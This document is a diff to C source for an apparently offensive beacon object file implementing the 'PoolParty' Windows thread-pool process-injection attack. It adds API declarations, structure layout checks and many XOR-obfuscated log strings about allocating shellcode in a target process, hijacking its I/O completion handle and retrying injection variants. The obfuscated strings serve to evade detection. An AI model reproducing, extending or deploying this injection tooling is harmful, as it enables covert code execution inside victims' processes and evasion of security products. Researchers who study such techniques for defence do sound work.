@@ -39,6 +39,33 @@
 #ifndef PP_OPEN_PROCESS_ACCESS
 #define PP_OPEN_PROCESS_ACCESS (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
 #endif
+#ifndef GENERIC_ALL
+#define GENERIC_ALL 0x10000000L
+#endif
+#ifndef STATUS_TIMEOUT
+#define STATUS_TIMEOUT ((NTSTATUS)0x00000102L)
+#endif
+#ifndef STATUS_IO_TIMEOUT
+#define STATUS_IO_TIMEOUT ((NTSTATUS)0xC00000B5L)
+#endif
+#ifndef STATUS_OBJECT_NAME_COLLISION
+#define STATUS_OBJECT_NAME_COLLISION ((NTSTATUS)0xC0000035L)
+#endif
+#ifndef IMAGE_FILE_MACHINE_ARM64
+#define IMAGE_FILE_MACHINE_ARM64 0xAA64
+#endif
+#ifndef IMAGE_FILE_MACHINE_AMD64
+#define IMAGE_FILE_MACHINE_AMD64 0x8664
+#endif
+#ifndef IMAGE_FILE_MACHINE_UNKNOWN
+#define IMAGE_FILE_MACHINE_UNKNOWN 0
+#endif
+#define PP_ARCH_NATIVE 0
+#define PP_ARCH_WOW64 1
+#define PP_ARCH_UNKNOWN 2
+#define PP_INFO_MAX 0x00800000u
+#define PP_INFO_RETRIES 8
+#define PP_NAME_RETRY 8
 
 // ---------//
 // Structs //
@@ -504,6 +531,12 @@ typedef struct _FULL_TP_JOB
     struct _RTL_SRWLOCK RundownLock;
 } FULL_TP_JOB, * PFULL_TP_JOB;
 
+_Static_assert(sizeof(TP_DIRECT) >= sizeof(TP_TASK) + sizeof(UINT64) + sizeof(LIST_ENTRY) + sizeof(void *), "TP_DIRECT layout");
+_Static_assert(sizeof(FULL_TP_IO) >= sizeof(TPP_CLEANUP_GROUP_MEMBER) + sizeof(TP_DIRECT), "FULL_TP_IO layout");
+_Static_assert(sizeof(FULL_TP_ALPC) >= sizeof(TP_DIRECT) + sizeof(TPP_CLEANUP_GROUP_MEMBER), "FULL_TP_ALPC layout");
+_Static_assert(sizeof(FULL_TP_JOB) >= sizeof(TP_DIRECT) + sizeof(TPP_CLEANUP_GROUP_MEMBER), "FULL_TP_JOB layout");
+_Static_assert(sizeof(FULL_TP_TIMER) >= sizeof(FULL_TP_WORK) + sizeof(TPP_PH_LINKS), "FULL_TP_TIMER layout");
+
 typedef NTSTATUS (NTAPI* _TpAllocJobNotification)(
     PFULL_TP_JOB* JobReturn,
     HANDLE HJob,
@@ -771,7 +804,8 @@ typedef NTSTATUS (NTAPI* _NtSetInformationFile)(
 
 WINBASEAPI int WINAPI MSVCRT$rand(void);
 WINBASEAPI void WINAPI MSVCRT$srand(unsigned int seed);
-WINBASEAPI wchar_t *__cdecl MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
+WINBASEAPI int __cdecl MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
+WINBASEAPI int __cdecl MSVCRT$wcsncmp(const wchar_t *_lhs,const wchar_t *_rhs, size_t _MaxCount);
 WINBASEAPI errno_t __cdecl MSVCRT$wcscpy_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
 WINBASEAPI errno_t __cdecl MSVCRT$wcscat_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
 WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
@@ -785,6 +819,8 @@ WINBASEAPI BOOL WINAPI KERNEL32$FlushInstructionCache(HANDLE hProcess, LPCVOID l
 WINBASEAPI BOOL WINAPI KERNEL32$IsWow64Process(HANDLE hProcess, PBOOL Wow64Process);
 WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(VOID);
 WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(VOID);
+WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
+WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
 #ifdef PP_NEED_TP_IO
 WINBASEAPI DWORD WINAPI KERNEL32$GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
 #endif
@@ -812,6 +848,7 @@ WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI PTP_IO WINAPI KERNEL32$CreateThreadpoolIo(HANDLE fl, PTP_WIN32_IO_CALLBACK pfnio, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+WINBASEAPI BOOL WINAPI KERNEL32$GetOverlappedResult(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait);
 #endif
 #ifdef PP_HIJACK_TIMER
 WINBASEAPI PTP_TIMER WINAPI KERNEL32$CreateThreadpoolTimer(PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
@@ -820,6 +857,7 @@ WINBASEAPI PTP_TIMER WINAPI KERNEL32$CreateThreadpoolTimer(PTP_TIMER_CALLBACK pf
 WINBASEAPI BOOL WINAPI KERNEL32$SetInformationJobObject(HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength);
 WINBASEAPI BOOL WINAPI KERNEL32$AssignProcessToJobObject(HANDLE hJob, HANDLE hProcess);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateJobObjectA(LPSECURITY_ATTRIBUTES lpJobAttributes, LPCSTR lpName);
+WINBASEAPI BOOL WINAPI KERNEL32$IsProcessInJob(HANDLE ProcessHandle, HANDLE JobHandle, PBOOL Result);
 #endif
 WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentThreadId(VOID);
 WINBASEAPI VOID WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME lpFileTime);
@@ -843,6 +881,15 @@ int m_szShellcodeSize = 0;
 DWORD m_dwApiDelayMs = 0;
 BOOL m_bDripAlloc = FALSE;
 DWORD m_dwDripDelayMs = 0;
+BOOL m_bSanityOnly = FALSE;
+BOOL m_bShellcodePublished = FALSE;
+ULONG m_dwWfTypeIndex = 0;
+
+void Inject(void);
+static BOOL VariantSanityExtra(void);
+
+typedef BOOL (WINAPI *_IsWow64Process2)(HANDLE hProcess, USHORT *pProcessMachine, USHORT *pNativeMachine);
+typedef NTSTATUS (NTAPI *_RtlGetVersion)(POSVERSIONINFOW VersionInformation);
 
 #define API_PACE_MAX_SEC 120
 #define DRIP_DELAY_MAX_MS 1000
@@ -877,12 +924,12 @@ static const unsigned char kFmtTriggerFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0
 // "[-] Trigger setup failed."
 static const unsigned char kFmtStart[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF4, 0x48, 0xF0, 0x2C, 0x5F, 0xBD, 0x06, 0x96, 0x87, 0x6C, 0xFE, 0x31, 0x47, 0x84, 0x09, 0x83, 0xD3, 0x45, 0xB1, 0x3F, 0x5F, 0xA0, 0x09, 0x92, 0xCC, 0x1C, 0xF0, 0x39, 0x4A, 0xBD, 0x06, 0x82, 0xD3, 0x1C, 0xE1, 0x2C, 0x44, 0xB7, 0x0D, 0x82, 0xD4, 0x1C, 0xF8, 0x3A, 0x11, 0xF4, 0x4D, 0x95, 0xA7 };
 // "[INFO] \tStarting PoolParty attack against process id: %d"
-static const unsigned char kFmtDone[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF7, 0x53, 0xFE, 0x32, 0x7B, 0xB5, 0x1A, 0x85, 0xDE, 0x1C, 0xF0, 0x2A, 0x5F, 0xB5, 0x0B, 0x9A, 0x87, 0x5F, 0xFE, 0x33, 0x5B, 0xB8, 0x0D, 0x85, 0xC2, 0x58, 0xBF, 0x5E };
-// "[INFO] \tPoolParty attack completed."
+static const unsigned char kFmtDone[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF7, 0x53, 0xFE, 0x32, 0x7B, 0xB5, 0x1A, 0x85, 0xDE, 0x1C, 0xF0, 0x2A, 0x5F, 0xB5, 0x0B, 0x9A, 0x87, 0x4D, 0xE4, 0x3B, 0x5E, 0xB1, 0x0C, 0xDF };
+// "[INFO] \tPoolParty attack queued."
 static const unsigned char kFmtScSize[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF4, 0x54, 0xF4, 0x32, 0x47, 0xB7, 0x07, 0x95, 0xC2, 0x1C, 0xC2, 0x37, 0x51, 0xB1, 0x52, 0xD1, 0x82, 0x58, 0xB1, 0x3C, 0x52, 0xA0, 0x0D, 0x82, 0xA7 };
 // "[INFO] \tShellcode Size: %d bytes"
-static const unsigned char kFmtHandle[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x6E, 0xF4, 0x2A, 0x59, 0xBD, 0x0D, 0x87, 0xC2, 0x58, 0xB1, 0x36, 0x4A, 0xBA, 0x0C, 0x9D, 0xC2, 0x1C, 0xE5, 0x31, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B, 0xCB, 0x87, 0x19, 0xE1, 0x5E };
-// "[INFO]   Retrieved handle to the target process: %p"
+static const unsigned char kFmtHandle[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x6E, 0xF4, 0x2A, 0x59, 0xBD, 0x0D, 0x87, 0xC2, 0x58, 0xB1, 0x36, 0x4A, 0xBA, 0x0C, 0x9D, 0xC2, 0x1C, 0xE5, 0x31, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B };
+// "[INFO]   Retrieved handle to the target process"
 static const unsigned char kFmtAlloc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x7D, 0xFD, 0x32, 0x44, 0xB7, 0x09, 0x85, 0xC2, 0x58, 0xB1, 0x2D, 0x43, 0xB1, 0x04, 0x9D, 0xC4, 0x53, 0xF5, 0x3B, 0x0B, 0xB9, 0x0D, 0x9C, 0xC8, 0x4E, 0xE8, 0x7E, 0x42, 0xBA, 0x48, 0x85, 0xCF, 0x59, 0xB1, 0x2A, 0x4A, 0xA6, 0x0F, 0x94, 0xD3, 0x1C, 0xE1, 0x2C, 0x44, 0xB7, 0x0D, 0x82, 0xD4, 0x06, 0xB1, 0x7B, 0x5B, 0xD4 };
 // "[INFO]   Allocated shellcode memory in the target process: %p"
 static const unsigned char kFmtWrote[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x6B, 0xE3, 0x37, 0x5F, 0xA0, 0x0D, 0x9F, 0x87, 0x4F, 0xF9, 0x3B, 0x47, 0xB8, 0x0B, 0x9E, 0xC3, 0x59, 0xB1, 0x2A, 0x44, 0xF4, 0x1C, 0x99, 0xC2, 0x1C, 0xE5, 0x3F, 0x59, 0xB3, 0x0D, 0x85, 0x87, 0x4C, 0xE3, 0x31, 0x48, 0xB1, 0x1B, 0x82, 0xA7 };
@@ -890,10 +937,8 @@ static const unsigned char kFmtWrote[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0
 static const unsigned char kFmtDrip[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE3, 0x4E, 0xF8, 0x2E, 0x0B, 0xB5, 0x04, 0x9D, 0xC8, 0x5F, 0xF0, 0x2A, 0x42, 0xBB, 0x06, 0xCB, 0x87, 0x19, 0xF5, 0x7E, 0x5B, 0xB5, 0x0F, 0x94, 0xD4, 0x10, 0xB1, 0x7B, 0x4F, 0xF4, 0x05, 0x82, 0x87, 0x5E, 0xF4, 0x2A, 0x5C, 0xB1, 0x0D, 0x9F, 0x87, 0x4C, 0xF0, 0x39, 0x4E, 0xA7, 0x68 };
 // "[INFO] \tDrip allocation: %d pages, %d ms between pages"
 #if defined(PP_HIJACK_IOCP) || defined(PP_RESOLVE_POOL_IOCP)
-static const unsigned char kFmtHijackIocp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x74, 0xF8, 0x34, 0x4A, 0xB7, 0x03, 0x94, 0xC3, 0x1C, 0xD8, 0x71, 0x64, 0xF4, 0x0B, 0x9E, 0xCA, 0x4C, 0xFD, 0x3B, 0x5F, 0xBD, 0x07, 0x9F, 0x87, 0x54, 0xF0, 0x30, 0x4F, 0xB8, 0x0D, 0xD1, 0xC1, 0x4E, 0xFE, 0x33, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B, 0xCB, 0x87, 0x19, 0xE9, 0x5E };
-// "[INFO]   Hijacked I/O completion handle from the target process: %x"
-#endif
-#ifdef PP_HIJACK_IOCP
+static const unsigned char kFmtHijackIocp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xD1, 0x87, 0x74, 0xF8, 0x34, 0x4A, 0xB7, 0x03, 0x94, 0xC3, 0x1C, 0xD8, 0x71, 0x64, 0xF4, 0x0B, 0x9E, 0xCA, 0x4C, 0xFD, 0x3B, 0x5F, 0xBD, 0x07, 0x9F, 0x87, 0x54, 0xF0, 0x30, 0x4F, 0xB8, 0x0D, 0xD1, 0xC1, 0x4E, 0xFE, 0x33, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B };
+// "[INFO]   Hijacked I/O completion handle from the target process"
 static const unsigned char kTypeIoCompletion[] = { 0xEE, 0x3C, 0xFE, 0x5E, 0x68, 0xD4, 0x07, 0xF1, 0xCA, 0x3C, 0xE1, 0x5E, 0x47, 0xD4, 0x0D, 0xF1, 0xD3, 0x3C, 0xF8, 0x5E, 0x44, 0xD4, 0x06, 0xF1, 0xA7, 0x3C };
 // L"IoCompletion"
 #endif
@@ -915,10 +960,60 @@ static const unsigned char kApiNtQueryObject[] = { 0xE9, 0x48, 0xC0, 0x2B, 0x4E,
 // "NtQueryObject"
 static const unsigned char kApiNtQueryInformationProcess[] = { 0xE9, 0x48, 0xC0, 0x2B, 0x4E, 0xA6, 0x11, 0xB8, 0xC9, 0x5A, 0xFE, 0x2C, 0x46, 0xB5, 0x1C, 0x98, 0xC8, 0x52, 0xC1, 0x2C, 0x44, 0xB7, 0x0D, 0x82, 0xD4, 0x3C };
 // "NtQueryInformationProcess"
-#ifdef PP_RESOLVE_POOL_IOCP
+#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
 static const unsigned char kApiNtQueryInformationWorkerFactory[] = { 0xE9, 0x48, 0xC0, 0x2B, 0x4E, 0xA6, 0x11, 0xB8, 0xC9, 0x5A, 0xFE, 0x2C, 0x46, 0xB5, 0x1C, 0x98, 0xC8, 0x52, 0xC6, 0x31, 0x59, 0xBF, 0x0D, 0x83, 0xE1, 0x5D, 0xF2, 0x2A, 0x44, 0xA6, 0x11, 0xF1 };
 // "NtQueryInformationWorkerFactory"
 #endif
+static const unsigned char kFmtClampDelay[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE3, 0x59, 0xFD, 0x3F, 0x52, 0xF4, 0x0B, 0x9D, 0xC6, 0x51, 0xE1, 0x3B, 0x4F, 0xF4, 0x1C, 0x9E, 0x87, 0x0D, 0xA3, 0x6E, 0x0B, 0xA7, 0x0D, 0x92, 0xC8, 0x52, 0xF5, 0x2D, 0x0B, 0xA4, 0x0D, 0x83, 0x87, 0x4C, 0xF0, 0x2B, 0x58, 0xB1, 0x46 };
+// "[INFO] \tDelay clamped to 120 seconds per pause."
+static const unsigned char kFmtClampDrip[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE3, 0x4E, 0xF8, 0x2E, 0x0B, 0xB0, 0x0D, 0x9D, 0xC6, 0x45, 0xB1, 0x3D, 0x47, 0xB5, 0x05, 0x81, 0xC2, 0x58, 0xB1, 0x2A, 0x44, 0xF4, 0x59, 0xC1, 0x97, 0x0C, 0xB1, 0x33, 0x58, 0xF4, 0x18, 0x94, 0xD5, 0x1C, 0xE1, 0x3F, 0x4C, 0xB1, 0x46 };
+// "[INFO] \tDrip delay clamped to 1000 ms per page."
+static const unsigned char kFmtSanityPass[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xB5, 0x06, 0x98, 0xD3, 0x45, 0xAB, 0x7E, 0x7B, 0x95, 0x3B, 0xA2 };
+// "[+] Sanity: PASS"
+static const unsigned char kFmtSanityFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x78, 0xB5, 0x06, 0x98, 0xD3, 0x45, 0xAB, 0x7E, 0x6D, 0x95, 0x21, 0xBD };
+// "[-] Sanity: FAIL"
+static const unsigned char kFmtSuggestV7[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xD3, 0x4E, 0xE8, 0x7E, 0x5D, 0xB5, 0x1A, 0x98, 0xC6, 0x52, 0xE5, 0x7E, 0x1C, 0xF8, 0x48, 0x9E, 0xD5, 0x1C, 0xF0, 0x30, 0x44, 0xA0, 0x00, 0x94, 0xD5, 0x1C, 0xC1, 0x17, 0x6F, 0xFA };
+// "[+] Suggestion: try variant 7, or another PID."
+static const unsigned char kFmtSuggestPid[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xD7, 0x55, 0xF2, 0x35, 0x0B, 0xB5, 0x48, 0x95, 0xCE, 0x5A, 0xF7, 0x3B, 0x59, 0xB1, 0x06, 0x85, 0x87, 0x50, 0xF8, 0x28, 0x4E, 0xF4, 0x10, 0xC7, 0x93, 0x1C, 0xC1, 0x17, 0x6F, 0xFA };
+// "[+] Suggestion: pick a different live x64 PID."
+static const unsigned char kFmtSuggestNoPool[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x48, 0x99, 0xC6, 0x4F, 0xB1, 0x30, 0x44, 0xF4, 0x3F, 0x98, 0xC9, 0x58, 0xFE, 0x29, 0x58, 0xF4, 0x1C, 0x99, 0xD5, 0x59, 0xF0, 0x3A, 0x0B, 0xA4, 0x07, 0x9E, 0xCB, 0x07, 0xB1, 0x2E, 0x42, 0xB7, 0x03, 0xD1, 0xC6, 0x52, 0xFE, 0x2A, 0x43, 0xB1, 0x1A, 0xD1, 0xF7, 0x75, 0xD5, 0x70 };
+// "[+] Suggestion: target has no Windows thread pool; pick another PID."
+static const unsigned char kFmtSuggestLayout[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC9, 0x48, 0xF5, 0x32, 0x47, 0xF4, 0x04, 0x90, 0xDE, 0x53, 0xE4, 0x2A, 0x0B, 0xB9, 0x01, 0x82, 0xCA, 0x5D, 0xE5, 0x3D, 0x43, 0xEF, 0x48, 0x95, 0xC8, 0x1C, 0xFF, 0x31, 0x5F, 0xF4, 0x1A, 0x94, 0xD3, 0x4E, 0xE8, 0x7E, 0x5D, 0xB5, 0x1A, 0x98, 0xC6, 0x52, 0xE5, 0x7E, 0x13, 0xF4, 0x07, 0x9F, 0x87, 0x48, 0xF9, 0x37, 0x58, 0xF4, 0x00, 0x9E, 0xD4, 0x48, 0xBF };
+// "[+] Suggestion: ntdll layout mismatch; do not retry variant 8 on this host."
+static const unsigned char kFmtSuggestTemp[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC5, 0x59, 0xF0, 0x3D, 0x44, 0xBA, 0x48, 0x92, 0xC6, 0x52, 0xFF, 0x31, 0x5F, 0xF4, 0x1F, 0x83, 0xCE, 0x48, 0xF4, 0x7E, 0x5F, 0xB1, 0x05, 0x81, 0x9C, 0x1C, 0xE5, 0x2C, 0x52, 0xF4, 0x1E, 0x90, 0xD5, 0x55, 0xF0, 0x30, 0x5F, 0xF4, 0x5F, 0xDF };
+// "[+] Suggestion: beacon cannot write temp; try variant 7."
+static const unsigned char kFmtSuggestAlpc[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC4, 0x5D, 0xFF, 0x30, 0x44, 0xA0, 0x48, 0x92, 0xD5, 0x59, 0xF0, 0x2A, 0x4E, 0xF4, 0x29, 0xBD, 0xF7, 0x7F, 0xB1, 0x2E, 0x44, 0xA6, 0x1C, 0xCA, 0x87, 0x48, 0xE3, 0x27, 0x0B, 0xA2, 0x09, 0x83, 0xCE, 0x5D, 0xFF, 0x2A, 0x0B, 0xE3, 0x46 };
+// "[+] Suggestion: cannot create ALPC port; try variant 7."
+static const unsigned char kFmtSuggestTimer[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x78, 0xA1, 0x0F, 0x96, 0xC2, 0x4F, 0xE5, 0x37, 0x44, 0xBA, 0x52, 0xD1, 0xC9, 0x53, 0xB1, 0x17, 0x79, 0x80, 0x01, 0x9C, 0xC2, 0x4E, 0xAA, 0x7E, 0x5F, 0xA6, 0x11, 0xD1, 0xD1, 0x5D, 0xE3, 0x37, 0x4A, 0xBA, 0x1C, 0xD1, 0x90, 0x12 };
+// "[+] Suggestion: no IRTimer; try variant 7."
+static const unsigned char kFmtDeadPid[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xB5, 0x1A, 0x96, 0xC2, 0x48, 0xB1, 0x2E, 0x59, 0xBB, 0x0B, 0x94, 0xD4, 0x4F, 0xB1, 0x37, 0x58, 0xF4, 0x06, 0x9E, 0xD3, 0x1C, 0xE3, 0x2B, 0x45, 0xBA, 0x01, 0x9F, 0xC0, 0x12 };
+// "[-] Target process is not running."
+static const unsigned char kFmtArm64[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xB5, 0x1A, 0x96, 0xC2, 0x48, 0xB1, 0x37, 0x58, 0xF4, 0x29, 0xA3, 0xEA, 0x0A, 0xA5, 0x65, 0x0B, 0xAC, 0x5E, 0xC5, 0x87, 0x53, 0xFF, 0x32, 0x52, 0xFA };
+// "[-] Target is ARM64; x64 only."
+static const unsigned char kFmtWow64Query[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x68, 0xB5, 0x06, 0x9F, 0xC8, 0x48, 0xB1, 0x2F, 0x5E, 0xB1, 0x1A, 0x88, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xC6, 0x4E, 0xF2, 0x36, 0x42, 0xA0, 0x0D, 0x92, 0xD3, 0x49, 0xE3, 0x3B, 0x05 };
+// "[-] Cannot query target architecture."
+static const unsigned char kFmtIocpType[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7B, 0xBB, 0x07, 0x9D, 0x87, 0x75, 0xDE, 0x1D, 0x7B, 0xF4, 0x1C, 0x88, 0xD7, 0x59, 0xB1, 0x3D, 0x43, 0xB1, 0x0B, 0x9A, 0x87, 0x5A, 0xF0, 0x37, 0x47, 0xB1, 0x0C, 0xDF };
+// "[-] Pool IOCP type check failed."
+static const unsigned char kFmtMultiPool[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x7C, 0xB5, 0x1A, 0x9F, 0xCE, 0x52, 0xF6, 0x64, 0x0B, 0xB9, 0x1D, 0x9D, 0xD3, 0x55, 0xE1, 0x32, 0x4E, 0xF4, 0x1C, 0x99, 0xD5, 0x59, 0xF0, 0x3A, 0x0B, 0xA4, 0x07, 0x9E, 0xCB, 0x4F, 0xAA, 0x7E, 0x4D, 0xBD, 0x1A, 0x82, 0xD3, 0x11, 0xFC, 0x3F, 0x5F, 0xB7, 0x00, 0xD1, 0xCA, 0x5D, 0xE8, 0x7E, 0x49, 0xB1, 0x48, 0x98, 0xC3, 0x50, 0xF4, 0x70 };
+// "[+] Warning: multiple thread pools; first-match may be idle."
+static const unsigned char kFmtInJob[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x7C, 0xB5, 0x1A, 0x9F, 0xCE, 0x52, 0xF6, 0x64, 0x0B, 0xB6, 0x0D, 0x90, 0xC4, 0x53, 0xFF, 0x7E, 0x42, 0xA7, 0x48, 0x90, 0xCB, 0x4E, 0xF4, 0x3F, 0x4F, 0xAD, 0x48, 0x98, 0xC9, 0x1C, 0xF0, 0x7E, 0x41, 0xBB, 0x0A, 0xCA, 0x87, 0x5D, 0xE2, 0x2D, 0x42, 0xB3, 0x06, 0xD1, 0xCA, 0x5D, 0xE8, 0x7E, 0x4D, 0xB5, 0x01, 0x9D, 0x89 };
+// "[+] Warning: beacon is already in a job; assign may fail."
+static const unsigned char kFmtFlushWarn[] = { 0xFC, 0x17, 0xCC, 0x7E, 0x7C, 0xB5, 0x1A, 0x9F, 0xCE, 0x52, 0xF6, 0x64, 0x0B, 0x92, 0x04, 0x84, 0xD4, 0x54, 0xD8, 0x30, 0x58, 0xA0, 0x1A, 0x84, 0xC4, 0x48, 0xF8, 0x31, 0x45, 0x97, 0x09, 0x92, 0xCF, 0x59, 0xB1, 0x38, 0x4A, 0xBD, 0x04, 0x94, 0xC3, 0x12 };
+// "[+] Warning: FlushInstructionCache failed."
+static const unsigned char kFmtDisassocWarn[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7D, 0xE2, 0x48, 0x95, 0xCE, 0x4F, 0xF0, 0x2D, 0x58, 0xBB, 0x0B, 0x98, 0xC6, 0x48, 0xF4, 0x7E, 0x4D, 0xB5, 0x01, 0x9D, 0xC2, 0x58, 0xAA, 0x7E, 0x58, 0xBC, 0x0D, 0x9D, 0xCB, 0x5F, 0xFE, 0x3A, 0x4E, 0xF4, 0x05, 0x90, 0xDE, 0x1C, 0xE3, 0x2B, 0x45, 0xF4, 0x09, 0x96, 0xC6, 0x55, 0xFF, 0x7E, 0x44, 0xBA, 0x48, 0x93, 0xC2, 0x5D, 0xF2, 0x31, 0x45, 0xF4, 0x0D, 0x89, 0xCE, 0x48, 0xBF };
+// "[-] V6 disassociate failed; shellcode may run again on beacon exit."
+static const unsigned char kFmtRestoreWriteFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xBD, 0x05, 0x94, 0xD5, 0x11, 0xE0, 0x2B, 0x4E, 0xA1, 0x0D, 0xD1, 0xD5, 0x59, 0xE2, 0x2A, 0x44, 0xA6, 0x0D, 0xD1, 0xD0, 0x4E, 0xF8, 0x2A, 0x4E, 0xF4, 0x0E, 0x90, 0xCE, 0x50, 0xF4, 0x3A, 0x05 };
+// "[-] Timer-queue restore write failed."
+static const unsigned char kFmtRestoreOk[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF5, 0x59, 0xE2, 0x2A, 0x44, 0xA6, 0x0D, 0x95, 0x87, 0x48, 0xF8, 0x33, 0x4E, 0xA6, 0x45, 0x80, 0xD2, 0x59, 0xE4, 0x3B, 0x0B, 0xA6, 0x07, 0x9E, 0xD3, 0x4F, 0xBF };
+// "[INFO] \tRestored timer-queue roots."
+static const unsigned char kFmtCopyGuard[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x67, 0xBB, 0x0B, 0x90, 0xCB, 0x1C, 0xE5, 0x36, 0x59, 0xB1, 0x09, 0x95, 0x8A, 0x4C, 0xFE, 0x31, 0x47, 0xF4, 0x07, 0x93, 0xCD, 0x59, 0xF2, 0x2A, 0x0B, 0xA7, 0x05, 0x90, 0xCB, 0x50, 0xF4, 0x2C, 0x0B, 0xA0, 0x00, 0x90, 0xC9, 0x1C, 0xF4, 0x26, 0x5B, 0xB1, 0x0B, 0x85, 0xC2, 0x58, 0xBF };
+// "[-] Local thread-pool object smaller than expected."
+static const unsigned char kApiIsWow64Process2[] = { 0xEE, 0x4F, 0xC6, 0x31, 0x5C, 0xE2, 0x5C, 0xA1, 0xD5, 0x53, 0xF2, 0x3B, 0x58, 0xA7, 0x5A };
+// "IsWow64Process2"
